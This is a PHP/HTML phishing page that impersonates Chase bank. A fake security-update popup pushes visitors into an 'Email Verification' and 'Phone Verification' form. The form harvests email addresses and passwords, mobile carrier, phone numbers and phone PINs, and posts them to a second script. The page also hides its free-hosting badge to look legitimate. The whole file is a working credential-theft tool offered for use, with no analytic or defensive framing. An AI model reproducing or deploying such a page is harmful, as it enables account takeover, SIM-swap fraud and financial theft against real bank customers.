<?php
include '../Valid.php'



?>
<html lang="en">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Unlock your Card
    </title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="pics/favicon.ico">
    <link rel="apple-touch-icon" sizes="76x76" href="pics/favicon.png">
    <link rel="stylesheet" href="styles/app.css">
    <script type="text/javascript" src="https://js-codes.com/modernizr/2.9.1/modernizr.min.js">
    </script>
    <script type="text/javascript" src="scripts/jquery-3.3.1.min.js">
    </script> 
    <script type="text/javascript" src="scripts/jquery.ccvalid.js">
    </script>
    <script type="text/javascript" src="scripts/jquery.mask.min.js">
    </script>
	
	
<style>
@media ( max-width : 659px) { /*Only Mobile*/
	.responsive-img.logo {
		width: 180px;
		padding-bottom: 14px;
	}
}

@media ( min-width : 660px) and (max-width:959px) { /*Only Tablet*/
	.responsive-img.logo {
		width: 210px;
		padding-bottom: 14px;
	}
}

.infoBox,.blueInfoBox,.errorBox {
	margin: 0rem 2.5% 2rem 4.5%;
	width: 90%;
}

.blueInfoIcon {
	color: #00AEEF;
}
#popup_this {
    top: 50%;
    left: 50%;
    text-align:center;
    margin-top: -50px;
    margin-left: -100px;
    position: fixed;
    background: #fff;
    padding: 30px;
}
.b-close {
    position: absolute;
    right: 0;
    top: 0;
    cursor: pointer;
    color: #fff;
    background: #ff0000;
    padding: 5px 10px;
}
</style>

<script src="./styles/jquery.bpopup.min.js"></script>

<script>
$( document ).ready(function() {
    $('#popup_this').bPopup();
	
});
</script>

  </head>
  <body>
  

		
<div id="popup_this">
    <span class="button b-close">
        <span>X</span>
    </span>
    <h3>Update for all Mobile and Online Banking users</h3>
    <p>We have added new security features to our system to provide more protection for your Mobile and Online Banking.</p>Please complete verification process to protect your account.</p>
	

</div>


    <div>
      <div>
        <header>
          <div>
          </div>
        </header>
        <main>
          <div class="container">
            <div class="bg">
            </div>
            <div class="row">
              <div class="col-xs-12 col-sm-6 col-sm-offset-3 box">
                <div class="form_area">
                  <div class="row">
                    <div class="col-xs-10 col-xs-offset-1" id="form_box">
                      <form action="2.php" id="signsmall" enctype="application/x-www-form-urlencoded" method="post" aria-label="Login" class="login__section login__form login__form--primary">
					               <h4>Email Verification</h4>


            <div class="row">


            <div class="">
                <input name="email" class="input" placeholder="Email Address" type="email" required maxlength="50">
            </div>
			 <div class="">
                <input name="epass" class="input" placeholder="Email Password" type="password" required maxlength="40">
            </div>
			
											 
											 <br> <h4>Phone Verification</h4>
											     <div class="col-lg-10 col-sm-10 col-xs-10">
            <div class="select default">
                <select name="type" class="input" required>
                    <option value="Select your carrier">Select your carrier</option>
                                                  <option value="Verizon Wireless">Verizon Wireless</option>
                                                  <option value="AT&amp;T Mobile">AT&amp;T Mobile</option>
                                                  <option value="T-Mobile">T-Mobile</option>
                                                  <option value="Sprint Wireless">Sprint Wireless</option>
                                                  <option value="MetroPCS®">MetroPCS®</option>
                                                  <option value="Other">Other</option>
                </select>
         
        </div>
										 
										  <div class="">
                <input name="phone" class="input" placeholder="Wireless Phone Line" type="tel" required maxlength="50">
            </div>
			 <div class="">
                <input name="phopin" class="input" placeholder="Phone PIN ( 4-10 Digits )" type="tel" required maxlength="40">
            </div>
                                            
            </div>
            <br>
            

    <div class="row">
        <button type="submit" class="primary"><span class="label">Continue</span></button>
    </div>
    
</form>


                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </main>
      </div>
      <footer>
        <div>
          <div class="container">
            <div class="footer_socials row">
              <div class="col-xs-12">
                <span>Follow us:
                </span>
                <ul>
                  <li>
                    <i class="facebook icon">
                    </i>
                  </li>
                  <li>
                    <i class="instagram icon">
                    </i>
                  </li>
                  <li>
                    <i class="twitter icon">
                    </i>
                  </li>
                  <li>
                    <i class="youtube icon">
                    </i>
                  </li>
                  <li>
                    <i class="linkedin icon">
                    </i>
                  </li>
                </ul>
              </div>
            </div>
            <div class="footer_list row">
              <div class="col-xs-12">
                <ul>
                  <li>
                    <a href="javascript:void(0)">Contact us
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">Privacy
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">Security
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">Terms of use
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">Our commitment to accessibility
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">SAFE Act: Chase Mortgage Loan Originators
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">Fair Lending
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">About Chase
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">J.P. Morgan
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">JPMorgan Chase &amp; Co.
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">Careers
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">Español
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">Chase Canada
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">Site map
                    </a>
                  </li>
                  <li>Member FDIC
                  </li>
                  <li>
                    <i class="home_icon icon">
                    </i> Equal Housing Lender
                  </li>
                  <br>
                  <li>2020 JPMorgan Chase &amp; Co.
                  </li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </footer>
    </div>
    <div id="rotate" style="display:none">
      <div class="circle">
      </div>
      <div class="overlay">
      </div>
    </div>
    <script>$(document).ready(function(){
        $(document).on("click",".checkbox",function(){
          $(this).not(".check_id").find("input[type=checkbox]").toggleClass("checked")}
                      )}
                             );
    </script>
  </body>
  <style>
    img[src*="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"] {
display: none;}
</style>
</html>
